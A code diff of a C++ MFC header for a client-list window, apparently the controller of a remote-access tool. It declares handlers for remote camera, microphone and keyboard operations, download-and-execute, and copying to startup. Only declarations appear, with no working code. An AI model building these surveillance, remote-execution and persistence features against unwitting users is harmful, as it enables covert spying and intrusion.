@@ -7,7 +7,8 @@
 #define WM_CLIENT_BLOCK				(WM_USER + 403)
 #define WM_CLIENT_EDITCOMMENT		(WM_USER + 404)
 
-
+#define WM_KERNEL_ERROR					(WM_USER + 405)
+#define WM_KERNEL_UPDATE_UPLODA_STATU	(WM_USER + 406)
 
 class CClientList :
 	public CListCtrl
@@ -22,6 +23,9 @@ public:
 	afx_msg LRESULT OnClientLogout(WPARAM wParam, LPARAM lParam);
 
 	afx_msg LRESULT OnEditComment(WPARAM wParam, LPARAM lParam);
+	afx_msg LRESULT OnKernelError(WPARAM error, LPARAM lParam);
+
+	afx_msg LRESULT OnUpdateUploadStatu(WPARAM wParam,LPARAM lParam);
 
 	afx_msg void OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult);
 	
@@ -37,7 +41,11 @@ public:
 	afx_msg void OnOperationCamera();
 	afx_msg void OnSessionRestart();
 	afx_msg void OnOperationMicrophone();
-	afx_msg void OnOperationDownloadandexec();
+
+
 	afx_msg void OnOperationKeyboard();
+	afx_msg void OnUtilsAddto();
+	afx_msg void OnUtilsCopytostartup();
+	afx_msg void OnUtilsDownloadandexec();
 };
 
